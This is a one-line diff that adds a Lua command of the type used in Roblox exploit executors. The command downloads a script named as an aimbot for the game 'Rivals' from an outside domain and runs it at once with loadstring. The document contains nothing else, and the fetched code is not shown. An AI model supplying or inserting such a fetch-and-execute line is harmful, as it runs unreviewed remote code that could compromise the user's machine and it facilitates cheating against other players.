@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptfarmer.dpdns.org/loader/rivals-aimbot"))()
